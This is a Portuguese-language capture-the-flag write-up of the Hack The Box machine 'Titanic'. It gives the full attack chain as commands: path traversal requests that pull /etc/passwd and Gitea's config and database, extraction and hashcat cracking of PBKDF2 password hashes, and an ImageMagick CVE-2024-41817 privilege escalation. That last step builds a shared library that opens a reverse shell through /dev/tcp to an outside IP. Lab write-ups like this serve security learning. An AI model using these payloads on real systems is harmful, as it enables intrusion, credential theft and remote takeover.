## Introdução

Titanic é uma máquina Linux classificada como easy no Hack The Box, que envolve a exploração de uma vulnerabilidade de Path Traversal em uma aplicação Flask e análise de configurações do Gitea para escalação de privilégios

## Coleta de Informações

### Reconhecimento Ativo

Iniciamos com um scan de portas para identificar serviços disponíveis:

```bash
 nmap 10.10.11.55 -sC -sV -p- --min-rate 400
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
```

### Enumeração

Realizamos enumeração de virtual hosts:

```bash
ffuf -H "Host: FUZZ.titanic.htb"  -w "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt" -u http://titanic.htb/ -t 100 -fl 10
```

```text

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 10
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 3920ms]
```

Após descobrir o subdomínio `dev.titanic.htb`, adicionamos ao arquivo `/etc/hosts` e acessamos via navegador.

## Acesso Inicial

Na instância Gitea, encontramos dois repositórios importantes:

- `docker-config`: Contém configurações Docker do Gitea e MySQL
- `flask-app`: Contém a aplicação web vulnerável

No repositório `flask-app`, identificamos uma vulnerabilidade de Path Traversal na função `download_ticket()` na rota `/download`.

```python
@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404
```

O repositório `docker-config` revelou o path `/home/developer/gitea/data:/data` usado nas configurações do Gitea.

```yaml
services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"
    volumes:
      - /home/developer/gitea/data:/data
```

Utilizando a vulnerabilidade de Path Traversal, conseguimos extrair o passwd do sistema:

```bash
curl 'http://titanic.htb/download?ticket=../../../../../../../etc/passwd'
```

```text
root:x:0:0:root:/root:/bin/bash
...
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

Lendo a [documentação do Gitea](https://docs.gitea.com/administration/config-cheat-sheet), podemos identificar a localização padrão dos arquivos de configuração. O arquivo de configuração é salvo em `etc/gitea/conf/app.ini`; após a instalação, podemos utilizar o caminho `/home/developer/gitea/data:/data` (recuperado anteriormente) para localizar o arquivo `app.ini`.

(No momento da escrita deste writeup, estes posts estão indisponíveis.)

1. Extraímos o arquivo de configuração:

```bash
curl 'http://titanic.htb/download?ticket=../../../../../../../home/developer/gitea/data/gitea/conf/app.ini'
```

2. Obtivemos o banco de dados:

```bash
wget 'http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db' -O gitea.db
```

3. Extraímos informações de usuários:

```sql
sqlite3 gitea.db "select name, passwd_hash_algo, passwd, salt from user"
```

```text
administrator|pbkdf2$50000$50|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b
developer|pbkdf2$50000$50|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34
```

Após conseguimos o hash do usuário, podemos pesquisar maneiras de quebrar o PBKDF2 utilizando hashcat. Alguns posts que tratam do assunto são:

- <https://hashcat.net/forum/thread-7854.html>
- <https://hashcat.net/forum/thread-8391-post-44775.html#pid44775>

Após obtermos o hash do usuário, precisamos formatá-lo adequadamente para o hashcat. Para isso, solicitei o chatgpt para gerar um script que extrai e formata as informações no padrão que precisamos do banco de dados SQLite:

```python
import sqlite3
import base64

# Conectar ao banco de dados SQLite
conn = sqlite3.connect("gitea.db")
cursor = conn.cursor()

# Executar a query para obter os dados necessários
cursor.execute("SELECT passwd, salt, name FROM user WHERE name = 'developer'")


with open("gitea.hashes", "w") as f:
    for passwd_hex, salt_hex, name in cursor.fetchall():
        # Converter de hexadecimal para bytes e depois para Base64
        passwd_b64 = base64.b64encode(bytes.fromhex(passwd_hex)).decode()
        salt_b64 = base64.b64encode(bytes.fromhex(salt_hex)).decode()

        # Formatar no padrão Hashcat
        hashcat_entry = f"{name}:sha256:50000:{salt_b64}:{passwd_b64}"


        print(hashcat_entry)
        f.write(hashcat_entry + "\n")

conn.close()
```

Com o hash formatado corretamente, podemos então usar o hashcat para quebrá-lo:

4. Quebramos o hash usando hashcat:

```bash
hashcat -m 10900 -w 3 gitea.hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --show --user
```

5. Agora podemos acessar a máquina com as credenciais de "developer", e coletamos a primeira flag.

## Post Exploitation

1. Poderíamos executar o linpeas para identificar as possibilidades de escalonamento de privilégios, porém nesse caso listaremos apenas os diretórios graváveis pelo nosso usuário.

```bash
find / -type d -writable 2>/dev/null
```

```text
...
/opt/app/static/assets/images
/opt/app/tickets
...
```

2. Ao explorar os diretórios /opt/scripts, podemos identificar um script.

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

O script parece utilizar o ImageMagick para identificar imagens no diretórios `/opt/app/static/assets/images` e grava a saída no arquivo metadata.log.

## Escalação de Privilégios

4. Podemos verificar a versão do ImageMagick para procurar por vulnerabilidades. Pesquisando no google encontramos a CVE-2024–41817 que podemos utilizar para escalar privilégio e coletar a flag de root.

```text
Version: ImageMagick 7.1.1-35
```

Na nossa máquina local, iremos ficar escutando na porta 4444, pois é a porta que iremos configurar na biblioteca compartilhada que executará nossa shell reversa.

```bash
sudo nc -nlvp 4444
```

No diretório do nosso usuário "developer", iremos criar a biblioteca que nos concedera o acesso root.

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.112/4444 0>&1'");
    exit(0);
}
EOF
```

Acesse o diretório de root e colete a flag.

## Conclusão

Este exercício demonstrou a exploração da vulnerabilidade de Path Traversal para extração de dados sensíveis e o aproveitamento de configurações vulneráveis do Gitea para escalonamento de privilégios. A exploração da vulnerabilidade no ImageMagick [CVE-2024-41817](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8) permitiu a execução de código levando a flag de root.

## Referências

- [Hack The Box](https://app.hackthebox.com/home)
- [ImageMagick CVE-2024-41817](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)
- [Documentação do Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Documentação Gitea](https://docs.gitea.com/administration/config-cheat-sheet)

## contribuidores

- [andre](https://www.linkedin.com/in/andreluisdantas65)
- [rio](https://www.linkedin.com/in/rio-ribeiro)
- [lucas](https://www.linkedin.com/in/lucas-rs-melo)
- [paixao](https://www.linkedin.com/in/darccau)
